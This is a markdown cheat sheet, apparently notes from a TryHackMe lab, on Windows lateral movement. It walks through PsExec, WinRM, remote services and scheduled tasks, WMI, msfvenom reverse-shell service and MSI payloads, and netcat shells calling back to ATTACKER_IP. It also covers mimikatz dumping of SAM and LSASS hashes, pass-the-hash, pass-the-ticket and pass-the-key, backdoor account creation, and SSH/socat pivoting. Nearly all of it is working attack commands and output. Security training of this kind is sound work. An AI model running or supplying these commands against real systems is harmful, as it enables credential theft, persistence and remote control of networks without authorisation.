# Tools
 - `Psexec`
 - `Mimikatz`

# Spawning remote process
## Psexec
Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access.

Requirements:
 - **Ports**: 445/TCP (SMB)
 - **Required Group Memberships**: Administrators

Command to execute Psexec:
> psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

# Remote Process Creation Using WinRM
Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

Requirements:
- **Ports**: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Remote Management Users

Command line to connect to a remote Powershell session:
> winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
```PowerShell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Create an interactive session using the Enter-PSSession cmdlet:
```PowerShell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:
```PowerShell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```
## Remotely Creating Services Using sc
Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

Requirements:
 - **Ports**:
     - 135/TCP, 49152-65535/TCP (DCE/RPC)
     - 445/TCP (RPC over SMB Named Pipes)
     - 139/TCP (RPC over SMB Named Pipes)
 - **Required Group Memberships**: Administrators

In the attackbox create a reverse shell payload
```terminal
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

Use `SMBClient` to transfer the payload to the compromized admin account
```terminal
smbclient -c 'put myservice.exe' -U <ADMIN> -W ZA '//<DOMAIN>/admin$/' <PASSWORD>
```

Set up listener:
```terminal
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4444;exploit"
```

Open another listener on your attack machine:
```
nc -lvp 4443
```

Go back to the initial victim pc and spawn a shell from that account using `runas`
```terminal
runas /netonly /user:<USERNAME> "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

We can create and start a service named `"MALICIOUS_Service"` using the following commands:
```cmd
sc.exe \\TARGET create MALICIOUS_Service binPath= "net user <USERNAME> <PASSWORD> /add" start= auto
sc.exe \\TARGET start MALICIOUS_Service
```

To stop and delete the service, we can then execute the following commands:
```cmd
sc.exe \\TARGET stop MALICIOUS_Service
sc.exe \\TARGET delete MALICIOUS_Service
```

## Creating Scheduled Tasks Remotely
Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. We can create tasks by using the following commands:
```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "MALICIOUS_TASK" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "MALICIOUS_TASK" 
```

To delete the scheduled task, we can use the following command and clean up after ourselves:
```cmd
schtasks /S TARGET /TN "MALICIOUS_TASK" /DELETE /F
```

# Using WMI
In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

## Connecting to WMI From Powershell
We need to create a PSCredential object with our user and password:
```PowerShell
$username = 'Administrator';
$password = '<PASSWORD>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable
```PowerShell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI

Requirements:
- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships**: Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before. The example below creates a text file on the remote computer, wiith the `-value` of anything:
```PowerShell
$Command = "powershell.exe -Command Set-Content -Path <ANY_PATH> -Value <ANYTHING>";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

## Remote Service Creation Using WMI

Requirements:
- **Ports**:
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
 - **Required Group Memberships**: Administrators

We can create services with WMI through Powershell. To create a service called MAL_SERVICE, we can use the following command:
```PowerShell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "MAL_SERVICE";
DisplayName = "MAL_SERVICE";
PathName = "net user <USERNAME> <PASSWORD> /add"; # Your payload, here the service is creating a backdoor user account
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

We can get a handle on the service and start it with the following commands:
```PowerShell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'MAL_SERVICE'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:
```PowerShell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```


## Remotel Scheduled Tasks creation with WMI
Requirements:
 - **Ports**:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
  - **Required Group Memberships**: Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
```PowerShell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user <USERNAME> <PASSWORD> /add" #Your payload, here the service is creating a backdoor user account

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "MALICIOUS_TASK"
Start-ScheduledTask -CimSession $Session -TaskName "MALICIOUS_TASK"
```

To delete the scheduled task after it has been used, we can use the following command:
```PowerShell
Unregister-ScheduledTask -CimSession $Session -TaskName "MALICIOUS_TASK"
```

## Remote Installing MSI packages through WMI
MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker.

Requirements:
 - **Ports**:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
 - **Required Group Memberships**: Administrators

Create an MSI Payload using msvenom:
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4445 -f msi > myinstaller.msi
```

Deploy payload to victim machine:
```cmd
smbclient -c 'put myinstaller.msi' -U Administrator -W ZA '//<DOMAIN>/admin$/' <PASSWORD>
```

Set up listener:
```terminal
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4445;exploit"
```

Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:
```PowerShell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
We can achieve the same by us using wmic in legacy systems:
```PowerShell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```
# Using alternate authentication material

## NTLM Authentication
### Extracting NTLM hashes from local SAM:
This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

### Extracting NTLM hashes from LSASS memory:
This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
THMJMP2: Powershell
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```
We can then use the extracted hashes to perform a Pass-the-Hash attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows. Notice we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 
```cmd
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

_Note: If you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH._

### Using Pth from Linux Attack Machine
Connect to RDP using PtH:
> xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

Connect via psexec using PtH:
> psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

_Note: Only the linux version of psexec support PtH._

Connect to WinRM using PtH:
> evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

## Kerberos Authentication
### Pass-the-Ticket
Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine. For this process to work we will need both the ticket and the corresponding session key.
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

We can then inject the tickets into the current session with the following command:
```cmd
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-<DOMAIN>.kirbi
```

### Overpass-the-hash / Pass-the-Key
We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (nc64 is already available in THMJMP2 for your convenience):

**If we have the RC4 hash:**
```cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES128 hash:**
```cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES256 hash:**
```cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

# Port Forwarding
Most of the lateral movement techniques we have presented require specific ports to be available for an attacker. In real-world networks, the administrators may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing you from reaching SMB, RDP, WinRM or RPC ports.

## SSH Tunneling
SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To start a tunnell from the VICTIM_PC to the ATTACKER_PC we will create a user in the ATTACKER_PC (without access to any console for tunnelling) and set a password to use for creating the tunnels:
```cmd
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

### SSH Remote Port Forwarding
Remote port forwarding allows you to take a reachable port from the SSH client (in this case, VICTIM-PC) and project it into a remote SSH server (the attacker's machine).

**Why we need port forwarding if we have compromised VICTIM_PC and can run an RDP session directly from there?** 
The answer is simple: in a situation where we only have console access to VICTIM_PC, we won't be able to use any RDP client as we don't have a GUI. By making the port available to your attacker's machine, you can use a Linux RDP client to connect. Similar situations arise when you want to run an exploit against a port that can't be reached directly, as your exploit may require a specific scripting language that may not always be available at machines you compromise along the way.

To forward port \<PORT-X> (the port numbers does not have to match) on the server back to our attacker's machine, we can use the following command on VICTIM_PC:
```cmd
ssh tunneluser@<ATTACKER_PC_IP> -R <PORT-X>:<SERVER_IP>:<PORT-X> -N
```

Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:
```cmd
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

### SSH Local Port Forwarding
Local port forwarding allows us to "pull" a port from an SSH server (ATTACKER_MACHINE) into the SSH client (PIVOT_MACHINE). Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.
 
To forward port \<PORT-X> from the attacker's machine and make it available from VICTIM_PC, we can run the following command on VICTIM_PC:
```cmd
ssh tunneluser@<ATTACKER-PC_IP> -L *:<PORT-X>:127.0.0.1:<PORT-X> -N 
```

Since we are opening a new port on VICTIM_PC, we might need to add a firewall rule to allow for incoming connections (with dir=in). Administrative privileges are needed for this:
```cmd
netsh advfirewall firewall add rule name="Open Port <PORT-X>" dir=in action=allow protocol=TCP localport=<PORT-X>
```

## Port Forwarding With socat
In situations where SSH is not available, socat can be used to perform similar functionality. While not as flexible as SSH, socat allows you to forward ports in a much simpler way. One of the disadvantages of using socat is that we need to transfer it to the pivot host (VICTIM_PC in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.
 
Basic Socat syntax:
```cmd
socat TCP4-LISTEN:1234,fork TCP4:<VICTIM-SERVER>:<PORT>
```

Need to create firewall rule since port is being opened:
```cmd
netsh advfirewall firewall add rule name="Open Port <PORT>" dir=in action=allow protocol=TCP localport=\<PORT>
```

If we wanted to access port 3389 on the server using VICTIM_PC as a pivot as we did with SSH remote port forwarding, we could use the following command:
```cmd
socat TCP4-LISTEN:<PORT-X>,fork TCP4:<VICTIM-SERVER>:<PORT-X>
```

If we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:         
```cmd
socat TCP4-LISTEN:<PORT-X>,fork TCP4:<ATTACKER-IP>:<PORT-X>
```

## Dynamic Port Forwarding and SOCKS
While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, dynamic port forwarding allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a SOCKS proxy.

Use the SSH client to establish a reverse dynamic port forwarding with the following command:
```cmd
ssh tunneluser@<ATTACKER-IP> -R 9050 -N
```

We can easily use any of our tools through the SOCKS proxy by using proxychains. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at `/etc/proxychains.conf` on our AttackBox. If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for socks proxying:
```config
[ProxyList]
socks4  127.0.0.1 9050
```
The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.

If we now want to execute any command through the proxy, we can use proxychains:
```cmd
proxychains curl http://pxeboot.za.tryhackme.com
```

_Note: that some software like nmap might not work well with SOCKS in some circumstances, and might show altered results, so your mileage might vary._

